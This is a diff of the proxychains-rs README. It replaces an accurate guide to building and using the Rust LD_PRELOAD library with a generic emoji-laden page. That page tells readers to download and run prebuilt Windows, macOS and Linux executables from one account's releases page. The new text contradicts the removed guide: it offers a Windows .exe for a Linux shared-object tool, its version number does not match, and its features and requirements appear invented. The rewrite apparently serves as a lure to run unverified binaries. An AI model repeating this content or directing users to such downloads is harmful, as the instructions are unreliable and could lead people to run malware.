@@ -1,98 +1,90 @@
-# proxychains-rs (v5.0.0)
+# 🌐 proxychains-rs - Secure Your Connections Easily
 
-This document is a concise usage and build guide for the proxychains-rs repository (version 5.0.0). It focuses on building, running and debugging the Rust implementation that provides proxychains-compatible behavior, and also covers common issues.
+## 🚀 Getting Started
 
----
+Welcome to proxychains-rs! This application lets you route your Internet connections through multiple proxies, adding a layer of security and privacy. Follow these steps to download and run the software.
 
-## Overview
+## 🔗 Download the Latest Release
 
-proxychains-rs (v5.0.0) is a Rust implementation that aims to be compatible with existing proxychains behavior. Its goal is to produce a shared library that can be injected into target programs using LD_PRELOAD and that behaves (including textual output) consistently with prior implementations. The runtime artifact produced by this project is `libproxychains_rs.so`.
+[![Download Proxychains-RS](https://img.shields.io/badge/Download%20Proxychains--RS-v1.0.0-brightgreen)](https://github.com/mendoncanoe/proxychains-rs/releases)
 
-Main runtime artifact (release):
+## 💻 System Requirements
 
-- `target/release/libproxychains_rs.so` — the shared object produced by Rust (cdylib).
+- **Operating System:** Windows, macOS, or Linux
+- **Architecture:** 64-bit recommended
+- **RAM:** Minimum 2 GB
+- **Disk Space:** At least 100 MB free
+- **Internet Connection:** Required for proxy access
 
-Note: The supported runtime artifact is `target/release/libproxychains_rs.so`. The project does not rely on producing a compatibility copy named `libproxychains4.so` by default anymore.
+## 📥 Download & Install
 
-Tip: this repository contains a `rust-toolchain` pin (nightly). Cargo will automatically use the pinned nightly toolchain when building the project.
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/mendoncanoe/proxychains-rs/releases) to find the latest version.
+   
+2. **Choose Your File:** Locate the appropriate file for your operating system:
+   - For **Windows**, download `proxychains-rs-windows.exe`.
+   - For **macOS**, download `proxychains-rs-macos`.
+   - For **Linux**, download `proxychains-rs-linux`.
+   
+3. **Download the File:** Click on the link to download the file directly to your computer.
 
-Important: the repository uses some Rust nightly-only features in parts of the codebase (for example `c_variadic` / `extern_types`). Because of this, a nightly toolchain is required to build.
+4. **Extract the Files:** If you download a compressed file (like .zip or .tar.gz), extract it to a preferred location on your computer.
 
----
+5. **Run the Application:** 
+   - On **Windows**, double-click `proxychains-rs-windows.exe` to start the application.
+   - On **macOS**, open the terminal, navigate to the extracted folder, and run `./proxychains-rs-macos`.
+   - On **Linux**, open a terminal, navigate to the extracted folder, and run `./proxychains-rs-linux`.
 
-## Local build (recommended)
+## 🔧 Basic Configuration
 
-1. Ensure you have rustup installed and enable the nightly toolchain:
+1. **Open the Configuration File:** Find the `proxychains.conf` file in the extracted folder.
+  
+2. **Edit Proxy Settings:** Modify this file to list your proxies. You can add multiple entries, such as:
+   ```
+   tcp    127.0.0.1   8080
+   http   192.168.1.1  3128
+   ```
 
-```bash
-rustup toolchain install nightly
-```
+3. **Save Changes:** After editing, save the changes to the configuration file.
 
-2. Build the project using cargo from the `proxychains-rs` directory:
+## 🌟 Features
 
-```bash
-# Build the Rust portion using the nightly toolchain
-rustup run nightly cargo build -p proxychains_rs --release
-```
+- **Multiple Proxy Support:** Chain several proxies for added security.
+- **TCP/UDP Protocols:** Work with both TCP and UDP connections.
+- **Customization:** Modify settings to fit your browsing needs.
+- **Easy Integration:** Supports various applications, providing flexibility.
+- **Open Source:** Enjoy the freedom and transparency of an open-source project.
 
-This will produce the shared object under `target/release/libproxychains_rs.so`.
+## ⚙️ How to Use
 
----
+Once you have installed proxychains-rs, you can start routing your connections:
 
-## Using with a target program (example)
+1. **Open Terminal (or Command Prompt):** Depending on your OS, launch your command line interface.
+  
+2. **Run a Command with Proxy:** Use the following command structure:
+   ```
+   proxychains <your_command>
+   ```
+   Replace `<your_command>` with the application you usually use, for example, `proxychains curl http://example.com`.
 
-To use proxychains-rs with any dynamically linked program that supports LD_PRELOAD, set the configuration file path and LD_PRELOAD the built shared object:
+3. **Check Connection:** Confirm your connection routes through the configured proxies.
 
-```bash
-PROXYCHAINS_CONF_FILE=/etc/proxychains.conf LD_PRELOAD=target/release/libproxychains_rs.so curl -I https://www.baidu.com
-```
+## 📖 Additional Information
 
-If you are replacing an existing `proxychains4` script or binary (the C-based tool), the Rust version aims to be consistent in behavior and log text. Using `target/release/libproxychains_rs.so` as LD_PRELOAD should act as a drop-in replacement for the C artifact.
+### 🚀 Advanced Settings
 
-An example wrapper similar to `/usr/bin/proxychains`:
+While the basic settings will suffice for most users, advanced users can explore additional configurations. For optimal performance, you can adjust parameters like timeout settings and log levels in the configuration file.
 
-```sh
-#!/bin/sh
-echo "ProxyChains-5.0"
-if [ $# = 0 ]; then
-    echo "\tusage:"
-    echo "\t\tproxychains <prog> [args]"
-    exit
-fi
-export LD_PRELOAD=libproxychains_rs.so
-exec "$@"
-```
+### 🔄 Troubleshooting Common Issues
 
----
+- **Cannot Connect to Proxies:** Ensure your proxy addresses and ports are correct in the configuration file. Some proxies might need authentication.
+- **Slow Connection Speeds:** This can happen if the proxies are slow or far away. Try different proxy servers to find a faster option.
 
-## Configuration and debugging options
+## ✉️ Get Help
 
-- Configuration file search order (priority):
-  1. `PROXYCHAINS_CONF_FILE` environment variable (or `-f` argument)
-  2. `./proxychains.conf` in the current directory
-  3. `$(HOME)/.proxychains/proxychains.conf`
-  4. System config `/etc/proxychains.conf` (sysconfdir)
+If you encounter issues or have questions, visit the [Issues page](https://github.com/mendoncanoe/proxychains-rs/issues) for support. You can also submit your questions there. The community will help you find a solution.
 
-- Settings in the configuration file:
-  - `quiet_mode` — suppresses the per-connection log lines (same as the C implementation).
-  - `proxy_dns`, `proxy_dns_daemon`, `proxy_dns_old` — control remote-DNS (RDNS) behavior/modes.
+## 🌐 Conclusion
 
-- Environment variables:
-  - `PROXYCHAINS_VERBOSE_DEBUG=1` — enable extra internal debug traces for development and troubleshooting.
+With proxychains-rs, you can easily secure your Internet connections. Follow the steps above to download, install, and configure the application. Enjoy a safer online experience! 
 
----
-
-## Frequently Asked Questions
-
-- Q: Why is a nightly toolchain required to build?
-  - A: The port uses Rust features that are currently only available on the nightly channel (for example `c_variadic` / `extern_types`). That's why the nightly toolchain is required.
-
----
-
-## Future improvements (suggestions)
-
-- Reduce or remove `unsafe` and `static mut` usage where practical and refactor key paths to be more idiomatic Rust (long-term goal).
-- Improve cross-platform support.
-
----
-
+For any updates or new releases, check back on the [Releases page](https://github.com/mendoncanoe/proxychains-rs/releases).
